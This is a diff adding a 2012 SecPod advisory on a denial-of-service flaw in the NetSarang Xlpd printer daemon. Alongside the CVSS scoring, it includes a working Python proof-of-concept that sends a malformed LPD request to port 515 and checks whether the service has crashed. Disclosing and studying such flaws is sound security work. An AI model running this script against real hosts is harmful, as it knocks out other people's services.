@@ -1,0 +1,134 @@
+##############################################################################
+#
+# Title    : NetSarang Xlpd Printer Daemon Denial of Service Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netsarang.com
+# Advisory : http://secpod.org/blog/?p=457
+#            http://secpod.org/advisories/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS_Vuln.txt
+#            http://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py
+# Software : NetSarang Xlpd 4 Build 0100 and NetSarang Xmanager Enterprise 4 Build 0186
+# Date     : 01/02/2012
+#
+##############################################################################
+
+SecPod ID: 1033					14/12/2011 Issue Discovered
+						20/01/2012 Vendor Notified
+						No Response
+						01/02/2012 Advisory Released
+
+Class: Denial Of Service			Severity: Medium
+
+
+Overview:
+---------
+NetSarang Xlpd Printer Daemon version 4 is prone to a denial of service 
+vulnerability.
+
+
+Technical Description:
+----------------------
+The vulnerability is caused due to improper validation of malicious LPD 
+request sent to printer daemon, which allows remote attackers to crash the 
+service.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to cause denial of service
+condition.
+
+
+Affected Software:
+------------------
+NetSarang Xlpd 4 Build 0100
+NetSarang Xmanager Enterprise 4 Build 0186
+
+
+Tested on:
+-----------
+NetSarang Xlpd 4 Build 0100 on Windows XP SP3.
+NetSarang Xmanager Enterprise 4 Build 0186 on Windows XP SP3.
+Older versions might be affected.
+
+
+References:
+-----------
+http://www.netsarang.com
+http://secpod.org/blog/?p=457
+
+
+Proof of Concept:
+----------------
+http://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py
+
+
+Solution:
+----------
+Not available
+
+
+Risk Factor:
+-------------
+    CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NOT_REQUIRED
+        CONFIDENTIALITY_IMPACT = NONE
+        INTEGRITY_IMPACT       = NONE
+        AVAILABILITY_IMPACT    = PARTIAL
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)
+        Risk factor            = Medium
+
+Credits:
+--------
+Prabhu S Angadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
+
+#!/usr/bin/python
+##############################################################################
+#
+# Title    : NetSarang Xlpd Printer Daemon Denial of Service Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netsarang.com
+# Advisory : http://secpod.org/blog/?p=457
+#            http://secpod.org/advisories/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS_Vuln.txt
+#            http://secpod.org/exploits/SecPod_Exploit_NetSarang_Xlpd_Printer_Daemon_DoS.py
+# Software : NetSarang Xlpd 4 Build 0100 and NetSarang Xmanager Enterprise 4 Build 0186
+# Date     : 01/02/2012
+#
+##############################################################################
+
+import socket,sys,time
+
+port = 515
+
+if len(sys.argv) < 2:
+    print "\n[-] Usage: %s <target addr>" % sys.argv[0]
+    sys.exit(0)
+
+target = sys.argv[1]
+
+sockObj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+try:
+    sockObj.connect((target,port))
+except:
+    print "\n[-] Xlpd service is down."
+    sys.exit(0)
+
+sockObj.send("crap"+"LF")
+sockObj.send("LF")
+#Will wait for a while
+time.sleep(5)
+sockObj.close()
+
+try:
+    sockObj.connect((target,port))
+except:
+    print "\n[-] Xlpd service is crashed, unble to connect"
+
+sys.exit(0)
